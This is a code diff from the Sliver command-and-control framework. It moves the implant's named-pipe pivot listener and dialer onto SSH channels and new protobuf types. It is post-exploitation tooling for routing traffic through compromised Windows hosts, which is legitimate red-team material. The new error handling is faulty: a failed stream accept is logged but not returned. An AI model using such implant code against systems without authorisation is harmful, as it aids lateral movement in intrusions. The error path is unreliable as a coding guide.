@@ -23,19 +23,20 @@ import (
 	"log"
 	// {{end}}
 
-	"io"
 	"net"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"golang.org/x/crypto/ssh"
+
+	"github.com/bishopfox/sliver/protobuf/commpb"
 	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
 )
 
 // DialNamedPipe - A connection coming from the server, that needs to be routed via a Named Pipe
-func DialNamedPipe(handler *sliverpb.Handler, src io.ReadWriteCloser) error {
-	pipeName := handler.RHost
+func DialNamedPipe(info *commpb.Conn, ch ssh.NewChannel) error {
+	pipeName := info.RHost
 
 	// {{if .Config.Debug}}
-	log.Printf("Dialing Named Pipe on %s", handler.RHost)
+	log.Printf("Dialing Named Pipe on %s", info.RHost)
 	// {{end}}
 
 	// Get a conn and pipe -->
@@ -44,13 +45,26 @@ func DialNamedPipe(handler *sliverpb.Handler, src io.ReadWriteCloser) error {
 		// We should return an error to the server.
 		return err
 	}
+
+	// Accept stream and pipe
+	src, reqs, err := ch.Accept()
+	if err != nil {
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
+			// {{end}}
+		}
+	}
+	go ssh.DiscardRequests(reqs)
+
+	// Blocks
 	transport(src, dst)
 	return nil
 }
 
 // ListenNamedPipe - The implant is requested to start a Named Pipe reverse handler and return the
 // connection to the server, with the handler information passed in. This connection can be wrapped
-func ListenNamedPipe(handler *sliverpb.Handler) (ln net.Listener, err error) {
+func ListenNamedPipe(handler *commpb.Handler) (ln net.Listener, err error) {
 	pipeName := handler.LHost
 
 	// {{if .Config.Debug}}
@@ -65,11 +79,9 @@ func ListenNamedPipe(handler *sliverpb.Handler) (ln net.Listener, err error) {
 		return nil, err
 	}
 
-	// Create abstracted listener
-	listener := newListener(handler, ln)
-	listener.info.Application = sliverpb.ApplicationProtocol_NamedPipe
-
-	// Add listener to jobs
+	// Create abstracted listener and add to jobs
+	listener := newListenerNamedPipe(handler)
+	listener.ln = ln
 	Listeners.Add(listener)
 
 	go func() {
@@ -88,4 +100,25 @@ func ListenNamedPipe(handler *sliverpb.Handler) (ln net.Listener, err error) {
 	}()
 
 	return
+}
+
+type listenerNamedPipe struct {
+	info *commpb.Handler
+	ln   net.Listener
+}
+
+func newListenerNamedPipe(info *commpb.Handler) *listenerNamedPipe {
+	ln := &listenerNamedPipe{
+		info: info,
+	}
+	ln.info.Application = commpb.Application_NamedPipe
+	return ln
+}
+
+func (ln *listenerNamedPipe) Info() *commpb.Handler {
+	return ln.info
+}
+
+func (ln *listenerNamedPipe) close() error {
+	return ln.ln.Close()
 }
